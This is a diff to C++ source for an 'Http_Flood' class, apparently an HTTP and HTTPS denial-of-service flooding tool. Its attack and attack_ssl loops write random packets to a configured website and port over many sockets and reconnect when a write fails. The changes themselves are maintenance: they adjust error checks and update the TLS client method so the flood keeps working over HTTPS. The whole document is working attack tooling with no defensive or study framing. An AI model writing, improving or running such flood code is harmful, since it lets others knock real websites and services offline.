@@ -39,10 +39,10 @@ int Http_Flood::make_socket(const char *host, const char *port) {
         exit(EXIT_FAILURE);
     }
     for(p = servinfo; p != nullptr; p = p->ai_next) {
-        if((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) < 0) {
+        if((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
             continue;
         }
-        if(connect(sock, p->ai_addr, p->ai_addrlen) < 0) {
+        if(connect(sock, p->ai_addr, p->ai_addrlen) == -1) {
             close(sock);
             continue;
         }
@@ -68,7 +68,7 @@ void Http_Flood::broke(int) {
 }
 
 SSL_CTX *Http_Flood::InitCTX() {
-    const SSL_METHOD *method{TLSv1_client_method()};
+    const SSL_METHOD *method{TLS_client_method()};
     SSL_CTX *ctx;
     OpenSSL_add_ssl_algorithms();
     SSL_load_error_strings();
@@ -136,7 +136,7 @@ void Http_Flood::attack(const int *id) {
                 sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str());
             }
             const char *packet = Randomizer::randomPacket(conf);
-            if((r = write_socket(sockets[x], packet, static_cast<int>(strlen(packet)))) < 0){
+            if((r = write_socket(sockets[x], packet, static_cast<int>(strlen(packet)))) == -1){
                 cleanup(&sockets[x]);
                 sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str());
             }else{
@@ -176,7 +176,7 @@ void Http_Flood::attack_ssl(const int *id) {
                 SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
             }
             const char *packet = Randomizer::randomPacket(conf);
-            if((r = write_socket(SSLs[x], packet, static_cast<int>(strlen(packet)))) < 0){
+            if((r = write_socket(SSLs[x], packet, static_cast<int>(strlen(packet)))) == -1){
                 cleanup(SSLs[x], &sockets[x], CTXs[x]);
                 sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str());
                 CTXs[x] = InitCTX();
